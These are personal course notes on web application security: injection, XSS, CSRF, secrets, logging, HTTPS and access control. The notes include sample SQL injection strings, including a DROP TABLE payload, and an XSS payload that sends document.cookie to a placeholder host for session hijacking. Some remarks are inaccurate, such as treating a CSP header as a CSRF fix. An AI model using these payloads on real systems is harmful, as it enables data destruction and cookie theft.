---
title: JDSD 9 - Security
created: '2020-04-28T12:15:21.154Z'
modified: '2020-05-01T17:33:59.021Z'
---

# JDSD 9 - Security

* Security is like playing defence, you do a vital role but you never get the glory.
  * You only see the benefits of good security when you get hacked.
* The Security Checklist:
  * Authentication
  * Don't Trust Anyone
  * Data Management
  * Access Control
  * Secure Headers
  * Code Secrets
  * XSS & CSRF
  * HTTPS Everywhere
  * Logging
  * 3rd Party Libraries
  * Injections

## Injections

* Most common attacks.
* We recieve code from a 3rd party that we didn't really want.
* SQL Injections
  * ` ' or 1=1--`
    * This will see the password match or 1=1 which makes it true.
  * `; DROP TABLE users; --`
    * If someone tries to change their email to this, it would see the command to change the email and then run the command to drop the table.
    * The `--` means comment out everything after this.
* Imagine a simple web page where there is an input box, and what it put into the input box is rendered on the page. Like "Hello World".
  * This simply uses a `p.innerHTML = input` type code.
  * Script tags can't be injected to the page with this method, because the DOM only renders body script tags on page load. Rather than if they are inserted later on.
  * However, an `<img src="/" onerror="alert('boom');">` will run.
  * A better method would be to use: `var textnode = document.createTextNode(input); p.appendChild(textnode);`
    * This would convert the whole thing to text.
* How to fix:
  * Sanitise input.
    * Whitelist philosophy - For data validation/any input, only allow the user to input that type.
      * If it isn't the proper type, discard it.
    * Blacklist - Bad things you shouldn't do.
      * Remove html tags whilst preserving content.
      * Prevent the user from doing something with a notification.
  * Parametrize Queries
    * Pre-compiles the SQL statement
    * You have control over what the user enters.
  * Object relational mappers, - packages out there that already provide this.
    * Knex.js - We can only provide the parameters to the statement.

## 3rd Party Libraries

* As our applications grow, we depend on more 3rd party libraries.
  * It's not a bad thing to use code from other people. We use it top build applications faster.
  * When you add it to your project, we always want to check the package that we trust from people that we trust.
  * Go to their github page and look at the stars, forks and big community around it.
  * A lot of open source coummunity time has gone in to it.

### nsp and snyck

* `npm install -g nsp`
  * `nsp check # audit package.json`
  * nsp audits the package.json file, showing if their are vulnerabilities in packages.
* `npm install -g snyk`
  * `snyk test # audit node_modules directory`
  * we need to connect it to our github account.
* there are problems when using these tools because they update packages which are relied on by other packages.


## Logging

* Getting information from your system as to what is happening.
  * Use logs to find issues to see bugs and fix them.
  * If hackers aren't detected, then it can potentially get worse.
    * A breach can often be found a lot later by external security teams rather than internal logging.
* `npm install winston`
  * A logger a bit like console.log but better.
  * Winston can help do custom logging but it is up to you.
  * No logging input to the client.
* `npm install Morgan`
  * HTTP request logger middelware for Node.
  * With morgan, we can use `app.use(morgan('tiny'))` and this will do a small log.


## HTTPS Everywhere

* SSL/TLS Certificates
* HTTP is a plain-text transfer.
  * SSL/TLS creates a tunnel between client and server.
  * Without the S, usernames and password would be sent as plain text.
* letsencrypt.org
* CloudFlare - Host with cloudflare and you'd get https out of the box.
  * Helps against DDOS attacks.

## XSS + CSRF

* Cross site scripting.
  * Whenever an application includes untrusted data.
  * Allows a hacker to do stuff with the client's browser.
  * For example if someone used the `<img src="/" onerror="widow.location='haxxed.com?cookie=' + document.cookie">`
    * This would then load the page suggested, whilst revealing the cookie from the current site.
    * If, for example, this happened on twitter, you would then be able to log in on twitter.
    * Used for session hacking.
  * To solve, santize inputs.
* Cross site request forgery.
  * We, as a bad person, create a bad URL with malicious code
  * If you open the email with a bad link, already signed in to a banking website on the browser, it can take that cookie and use it on the other website.
  * To fix:

  ```javascript
  
  app.get('/', (req, res) => {
    res.set({
      'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"
    })
    res.send('Hello World!')
  });
  
  ```
  * Always validate and sanitise input.
  * Don't use eval()
  * Don't use document.write()
  * Set content security policy headers
  * Set Secure + HTTPOnly cookies.

## Code Secrets

### Environment Variables

* `process.env.NODE_ENV` - Would potentially leave us vulnerable to injections.
* `.env` - Create a new file.
  * Using .env we can securely add passwords to the app.
  * You don't commit the .env file.
* This .env file is kept as secret as possible as it has database passwords, etc.
* You can use it with `npm install -dotenv`

### Commit History

* Never put your secret files on github.
* You can see the password  in the commit history if it was previously committed.
* Solution: change your passwords


## Secure Headers

* Secure headers for express apps: `npm install helmet`
* Without this, headers show a lot of information which bad actors could use to expose vulnerablilities.

## Access Control

* Having restrictions on what authenticated users are allowed to do.
* We know the user but what do they have access to?
* Principle of least privilege
  * Give people only enough that they can do their work.
  * CORS - Cross Origin Resource Sharing - You need access to access the server.
    * You don't want people to be able to access our API endpoints, necessarily.
    * With CORS, you can add options/a whitelist so that only certain websites can access the server.

## Data Management

* Backups
  * Never have one point of failure.
  * Backups should be encrypted ideally.
* Limit sensitive data exposure
  * Encrypt sensitive data.
  * Encyrption for any data identifying users.

### Hashing Passwords

* Three libraries - `bcrypt`, `scrypt`, `Aragon2`
* Storing Passwords Blog: https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/

### Encrypting Sensitive Databases

* `pgcrypto` - encrypt a few columns in a Postgres database.


## Don't Trust Anyone

* We sadly can't assume that there is good people everywhere.


## Authentication

* Making sure the person on the other end is who they say they are.
  * Passwords.
  * Managing sessions.
* Think of password rules, multi-factor authentication.

* Owasp.org to keep up to date with security issues.

